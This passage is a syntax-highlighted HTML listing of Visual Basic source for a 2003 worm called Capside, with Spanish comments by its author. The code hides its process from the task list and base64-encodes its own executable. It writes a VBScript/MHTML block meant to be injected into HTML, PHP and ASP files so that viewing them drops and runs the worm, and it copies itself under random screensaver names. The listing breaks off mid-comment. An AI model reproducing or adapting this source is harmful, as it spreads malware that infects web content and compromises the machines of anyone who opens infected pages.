<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>P2P-Worm.Win32.gen-Capside - Form1.frm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc7">VERSION</span><span class="sc0"> </span><span class="sc2">5.00</span><span class="sc0">
</span><span class="sc3">Begin</span><span class="sc0"> </span><span class="sc7">VB.Form</span><span class="sc0"> </span><span class="sc7">Form1</span><span class="sc0"> 
   </span><span class="sc7">Caption</span><span class="sc0">         </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc4">"Form1"</span><span class="sc0">
   </span><span class="sc7">ClientHeight</span><span class="sc0">    </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">930</span><span class="sc0">
   </span><span class="sc7">ClientLeft</span><span class="sc0">      </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">60</span><span class="sc0">
   </span><span class="sc7">ClientTop</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">345</span><span class="sc0">
   </span><span class="sc7">ClientWidth</span><span class="sc0">     </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">1560</span><span class="sc0">
   </span><span class="sc7">Icon</span><span class="sc0">            </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc4">"Form1.frx"</span><span class="sc6">:</span><span class="sc2">0000</span><span class="sc0">
   </span><span class="sc7">LinkTopic</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc4">"Form1"</span><span class="sc0">
   </span><span class="sc7">ScaleHeight</span><span class="sc0">     </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">930</span><span class="sc0">
   </span><span class="sc7">ScaleWidth</span><span class="sc0">      </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">1560</span><span class="sc0">
   </span><span class="sc7">StartUpPosition</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">  </span><span class="sc1">'Windows Default
</span><span class="sc0">   </span><span class="sc7">Visible</span><span class="sc0">         </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">'False
</span><span class="sc0">   </span><span class="sc3">Begin</span><span class="sc0"> </span><span class="sc7">VB.Timer</span><span class="sc0"> </span><span class="sc7">Timer1</span><span class="sc0"> 
      </span><span class="sc7">Interval</span><span class="sc0">        </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">10000</span><span class="sc0">
      </span><span class="sc7">Left</span><span class="sc0">            </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">360</span><span class="sc0">
      </span><span class="sc7">Top</span><span class="sc0">             </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">240</span><span class="sc0">
   </span><span class="sc3">End</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Form1"</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_GlobalNameSpace</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Creatable</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_PredeclaredId</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Exposed</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc1">'Declaramos las apis para leer y escribir en archivos ini,
'para obtener nuestro proceso y reggistrarlo.
'y las constantes
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetPrivateProfileString</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"Kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetPrivateProfileStringA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpApplicationName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpKeyName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpDefault</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpReturnedString</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpFileName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WritePrivateProfileString</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"Kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"WritePrivateProfileStringA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpApplicationName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpKeyName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpString</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpFileName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetCurrentProcessId</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"Kernel32"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RegisterServiceProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"Kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwProcessID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwType</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">RSP_SIMPLE_SERVICE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">RSP_UNREGISTER_SERVICE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">'Declaramos variables
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Cf</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Cw</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Cd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">CodeCapsideB64</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">CodeScript1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">CodeScript2</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Form_Load</span><span class="sc6">()</span><span class="sc0">

</span><span class="sc1">'Empiezo este virus, agradeciendo a Dios, mi familia
'y a todas aquellas personas que aportaron algo, para ayudarme
'en uno de los momentos más dificiles de mi vida.
</span><span class="sc0">
</span><span class="sc1">'&lt;**********GEDZAC LABS 2003**********&gt;
'W32/Capside.worm By MachineDramon/GEDZAC
'Hecho en el Perú, Calidad Mundial
'03-04-2003  -  San Pedro de Tacna, Antes Valle del Takana
'sachiel2015@latinmail.com
'Worm De Concepto
'Derechos Reservados
</span><span class="sc0">
</span><span class="sc1">'Expresando el repudio a la guerra emprendida por el asesino
'de Bush
</span><span class="sc0">
</span><span class="sc1">'---------------------------------------------------------
</span><span class="sc0">

</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc1">'llamamos al sub HideProcess, para escondernos del
'Ctrl+atl+supr
</span><span class="sc7">HideProcess</span><span class="sc0">

</span><span class="sc1">'creamos un diccionario y le añadimos las extenciones de los
'archivos que infectaremos
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Cd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.Dictionary"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Cd.Add</span><span class="sc0"> </span><span class="sc4">"html"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Cd.Add</span><span class="sc0"> </span><span class="sc4">"htm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc7">Cd.Add</span><span class="sc0"> </span><span class="sc4">"php"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Cd.Add</span><span class="sc0"> </span><span class="sc4">"asp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Cd.Add</span><span class="sc0"> </span><span class="sc4">"shtml"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc7">Cd.Add</span><span class="sc0"> </span><span class="sc4">"shtm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Cd.Add</span><span class="sc0"> </span><span class="sc4">"phtml"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Cd.Add</span><span class="sc0"> </span><span class="sc4">"phtm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc7">Cd.Add</span><span class="sc0"> </span><span class="sc4">"plg"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Cd.Add</span><span class="sc0"> </span><span class="sc4">"htx"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Cd.Add</span><span class="sc0"> </span><span class="sc4">"mht"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Cd.Add</span><span class="sc0"> </span><span class="sc4">"mhtml"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">

</span><span class="sc1">'Creamos Scripting.FileSystemObject y WScript.Shell
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Cf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Cw</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc1">'obtenemos el codigo en base64 del virus
</span><span class="sc7">CodeCapsideB64</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">B64</span><span class="sc6">(</span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Capside.exe"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc1">'es parte del code que se insertara en los archivos infectados
</span><span class="sc7">CodeScript1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"MIME-Version: 1.0"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Content-Location:file:///Capside.exe"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Content-Transfer-Encoding: base64"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc7">CodeCapsideB64</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"&lt;Script Language = 'VBScript'&gt;"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">

</span><span class="sc7">CodeScript2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"id = setTimeout("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"IEB()"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">", 150)"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Sub IEB()"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Vpt = LCase(Document.url)"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Vtx="</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"&lt;object style=$cursor:cross-hair$ classid=$clsid:22222222-2222-2222-2222$  CODEBASE=$mhtml:"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"&amp;Vpt&amp;"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"!file:///Capside.exe$&gt;&lt;/object&gt;"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Vtx = Replace(Vtx, "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"$"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">", Chr(34)): Document.Write (Vtx) &amp; vbCrLf &amp; Capside"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"End Sub"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Function Ec(code)"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"For i = 1 To Len(code)"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Ck = Asc(Mid(code, i, 1))"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"If Ck = Asc("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"¥"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">") Then"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Ec = Ec &amp; "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"%"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"ElseIf Ck = 28 Then"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Ec = Ec &amp; Chr(13)"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"ElseIf Ck = 29 Then"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Ec = Ec &amp; Chr(10)"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Else"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Ec = Ec &amp; Chr(Ck Xor 7)"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"End If"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"Next"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"End Function"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"&lt;/Script&gt;"</span><span class="sc0">

</span><span class="sc1">'si no existe CapsideCode.htm , infectamos
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Cf.FileExists</span><span class="sc6">(</span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\CapsideCode.htm"</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Infeccion</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Latencia</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Para registrar nuestro servicio y escondernos de
'ctrl+alt+supr
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">HideProcess</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">H</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">H</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegisterServiceProcess</span><span class="sc6">(</span><span class="sc7">GetCurrentProcessId</span><span class="sc6">(),</span><span class="sc0"> </span><span class="sc7">RSP_SIMPLE_SERVICE</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Infeccion</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"!Por Cristo he sido salvado¡"</span><span class="sc0">

</span><span class="sc1">'creamos CapsideCode.htm
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">c</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.CreateTextFile</span><span class="sc6">(</span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\CapsideCode.htm"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">c.write</span><span class="sc0"> </span><span class="sc7">CodeScript1</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">CodeScript2</span><span class="sc0">
</span><span class="sc7">c.Close</span><span class="sc0">

</span><span class="sc1">'obtenemos un nombre aleatorio
</span><span class="sc7">Rn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RndN</span><span class="sc6">()</span><span class="sc0">

</span><span class="sc1">'si existe borramos capside.exe
</span><span class="sc7">Cf.DeleteFile</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Capside.exe"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc1">'nos copiamos como capside.exe y como NombreAleatorio.scr
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Capside.exe"</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Rn</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".scr"</span><span class="sc0">

</span><span class="sc1">'les damos atributos de oculto y sistema
